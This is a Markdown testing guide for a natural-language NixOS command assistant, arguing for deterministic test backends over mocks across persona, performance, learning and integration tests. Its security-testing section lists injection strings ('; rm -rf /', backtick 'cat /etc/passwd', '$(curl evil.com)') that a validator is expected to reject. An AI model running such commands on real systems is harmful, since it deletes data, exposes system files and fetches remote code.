# 🧪 Consciousness-First Testing Guide

*Building trust through real implementations, not illusions*

## Philosophy

Traditional mock-based testing creates a house of cards - tests that pass against fake implementations but fail in production. Consciousness-first testing uses real, deterministic implementations that honor the actual behavior of our system while remaining predictable for testing.

## Core Principles

### 1. Real Implementations Over Mocks
```python
# ❌ Traditional Mock Approach
mock_executor = Mock()
mock_executor.execute.return_value = Mock(returncode=0)

# ✅ Consciousness-First Approach
from tests.test_utils import TestExecutionBackend
executor = TestExecutionBackend()
# Real logic with deterministic behavior
```

### 2. Behavior-Driven, Not Implementation-Driven
Test what the system does for users, not how it does it internally.

```python
# ❌ Testing Implementation Details
def test_cache_key_format():
    assert cache._generate_key("test") == "cache:test:v1"

# ✅ Testing Behavior
def test_repeated_queries_are_fast():
    first_time = measure_time(lambda: nlp.process("install firefox"))
    second_time = measure_time(lambda: nlp.process("install firefox"))
    assert second_time < first_time * 0.1  # 10x faster
```

### 3. Persona-Aware Testing
Every feature must work for all 10 personas.

```python
from tests.test_utils import PERSONA_TEST_DATA, persona_test

@persona_test("maya_adhd")
def test_response_time_for_maya(persona, persona_data):
    """Maya needs responses in under 1 second."""
    start = time.time()
    response = system.process(persona_data['typical_inputs'][0])
    assert time.time() - start < persona_data['max_response_time']
```

## Test Architecture

### Shared Test Implementations

All test implementations live in `tests/test_utils/`:

```python
from tests.test_utils import (
    TestExecutionBackend,    # Simulates NixOS command execution
    TestNLPEngine,          # Deterministic NLP processing
    TestDatabase,           # In-memory SQLite
    TestLearningEngine,     # Predictable learning behavior
    TestBackendAPI,         # Full API simulation
)
```

### Dependency Injection Pattern

```python
class CommandExecutor:
    def __init__(self, backend=None):
        self.backend = backend or RealExecutionBackend()
    
    def execute(self, command):
        return self.backend.execute(command)

# In tests:
def test_executor():
    test_backend = TestExecutionBackend()
    executor = CommandExecutor(backend=test_backend)
    # Now we control the behavior exactly
```

## Common Patterns

### Testing Async Operations

```python
from tests.test_utils import async_test_fixture

@async_test_fixture
async def test_api_request(api):
    """Test with real async behavior."""
    response = await api.process_request({
        'method': 'process_with_xai',
        'params': {'input': 'install firefox'}
    })
    
    assert response['intent'] == 'install_package'
    assert response['xai_explanation']['confidence'] > 0.9
```

### Testing Learning Systems

```python
def test_learning_from_corrections():
    db = TestDatabase()
    learning = TestLearningEngine(db)
    
    # First attempt with typo
    learning.learn_from_interaction('user1', {
        'input': 'instal firefox',
        'intent': 'install',
        'success': True,
        'feedback': 'corrected: install'
    })
    
    # System should learn the correction
    stats = db.get_learning_stats('user1')
    assert stats['success_rate'] == 1.0
    
    # Check preference was recorded
    pref = db.get_preference('user1', 'preferred_packages')
    assert pref['value'] == 'firefox'
```

### Testing Error Paths

```python
def test_graceful_error_handling():
    backend = TestExecutionBackend()
    
    # Simulate package not found
    result = backend.execute('nix-env', ['-iA', 'nixos.nonexistent'])
    
    assert result.returncode == 1
    assert "not found" in result.stderr.decode()
    
    # Verify user-friendly error
    response = format_error_for_user(result)
    assert "I couldn't find that package" in response
    assert "Try searching for it first" in response
```

## Performance Testing

### Persona-Based Performance Requirements

```python
from tests.test_utils import performance_test

@performance_test(max_time=1.0)  # Maya's requirement
def test_simple_command_performance():
    """All simple commands must complete in under 1 second."""
    nlp = TestNLPEngine()
    
    for _ in range(100):  # Test consistency
        result = nlp.process("install firefox", persona="maya_adhd")
        assert result['processing_time'] < 0.1
```

### Memory Usage Testing

```python
def test_memory_efficiency():
    """Ensure we stay within memory budget."""
    import tracemalloc
    
    tracemalloc.start()
    
    # Process many commands
    backend = TestBackendAPI()
    for i in range(1000):
        backend.process_request({
            'method': 'process_with_xai',
            'params': {'input': f'install package{i}'}
        })
    
    current, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    
    assert peak < 300 * 1024 * 1024  # Under 300MB
```

## Integration Testing

### Full Pipeline Tests

```python
def test_complete_user_journey():
    """Test from natural language to execution."""
    # Setup
    nlp = TestNLPEngine()
    executor = TestExecutionBackend() 
    db = TestDatabase()
    learning = TestLearningEngine(db)
    
    # User input
    user_input = "I need that Firefox thing"
    
    # NLP processing
    intent = nlp.process(user_input, persona="grandma_rose")
    assert intent['intent'] == 'install'
    assert intent['package'] == 'firefox'
    
    # Execution
    result = executor.execute('nix-env', ['-iA', 'nixos.firefox'])
    assert result.returncode == 0
    
    # Learning
    learning.learn_from_interaction('grandma', {
        'input': user_input,
        'intent': 'install',
        'package': 'firefox',
        'success': True
    })
    
    # Verify learning worked
    model = learning.get_user_model('grandma')
    assert model['skill_level'] == 'beginner'
```

## Security Testing

### Boundary Testing

```python
def test_security_boundaries():
    """Ensure all inputs are validated."""
    backend = TestExecutionBackend()
    
    malicious_inputs = [
        "install firefox; rm -rf /",
        "install `cat /etc/passwd`",
        "install $(curl evil.com)",
    ]
    
    for evil in malicious_inputs:
        # Should be caught before execution
        with pytest.raises(SecurityError):
            validate_input(evil)
```

## Best Practices

### 1. Use Fixtures Wisely

```python
@pytest.fixture
def test_environment():
    """Provide complete test environment."""
    db = TestDatabase()
    yield {
        'db': db,
        'nlp': TestNLPEngine(),
        'executor': TestExecutionBackend(),
        'learning': TestLearningEngine(db),
    }
    db.close()  # Cleanup
```

### 2. Test Data Isolation

```python
def test_user_isolation():
    """Each user's data must be isolated."""
    db = TestDatabase()
    
    # User 1 learns firefox preference
    db.record_preference('user1', 'browser', 'firefox')
    
    # User 2 learns chrome preference  
    db.record_preference('user2', 'browser', 'chrome')
    
    # Verify isolation
    assert db.get_preference('user1', 'browser')['value'] == 'firefox'
    assert db.get_preference('user2', 'browser')['value'] == 'chrome'
```

### 3. Deterministic Behavior

```python
def test_deterministic_corrections():
    """Corrections should be consistent."""
    nlp = TestNLPEngine()
    
    # Same typo should always correct the same way
    for _ in range(10):
        result = nlp.process("instal fierfix")
        assert result['corrections'] == [
            ('instal', 'install'),
            ('fierfix', 'firefox')
        ]
```

## Migration Guide

### Converting Mock-Based Tests

```python
# Old mock-based test
def test_old_style():
    mock_exec = Mock()
    mock_exec.return_value = Mock(returncode=0, stdout=b"Done")
    
    result = some_function(mock_exec)
    assert result == "success"
    mock_exec.assert_called_once()

# New consciousness-first test
def test_new_style():
    executor = TestExecutionBackend()
    # Configure deterministic behavior if needed
    executor.package_db['mypackage'] = {'version': '1.0'}
    
    result = some_function(executor)
    assert result == "success"
    
    # Verify actual behavior
    assert 'mypackage' in executor.installed_packages
    assert len(executor.commands_executed) == 1
```

## Running Tests

```bash
# Run all consciousness-first tests
pytest tests/ -v

# Run with coverage
pytest tests/ --cov=nix_for_humanity --cov-report=html

# Run specific persona tests
pytest tests/ -k "maya" -v

# Run performance tests only
pytest tests/ -m "performance" -v
```

## Continuous Improvement

### Coverage Monitoring

```python
# In conftest.py
def pytest_collection_modifyitems(config, items):
    """Mark tests that use mocks for gradual migration."""
    for item in items:
        if "mock" in item.fixturenames or "Mock" in str(item.function):
            item.add_marker(pytest.mark.legacy_mock)
```

### Pre-commit Hooks

```yaml
# .pre-commit-config.yaml
- id: no-mocks
  name: Check for mock usage
  entry: ./scripts/check-no-mocks.sh
  language: script
  files: \.py$
```

## Benefits

1. **Real Confidence**: Tests exercise actual code paths
2. **Better Debugging**: Real stack traces, not mock confusion
3. **Documentation**: Tests show real usage patterns
4. **Maintainability**: Changes to implementation don't break tests
5. **User Focus**: Tests verify user-visible behavior

## Remember

> "A test that doesn't test real behavior is just elaborate self-deception. Build with consciousness, test with truth."

---

*Next: [Testing Standards](./04-CODE-STANDARDS.md#testing-standards)*